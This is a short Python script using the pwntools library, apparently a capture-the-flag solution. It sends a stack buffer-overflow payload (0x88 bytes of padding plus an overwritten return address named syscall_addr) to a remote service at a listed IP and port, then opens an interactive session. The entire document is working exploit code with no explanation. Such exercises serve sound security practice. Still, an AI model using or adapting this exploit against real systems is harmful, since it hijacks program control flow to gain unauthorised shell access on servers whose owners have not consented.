from pwn import *

syscall_addr = 0x40059A
payload = 'A'*(0x80+0x8) + p64(syscall_addr) 

p = remote('220.249.52.133','41548')
p.recvline()
p.sendline(payload)
p.interactive()
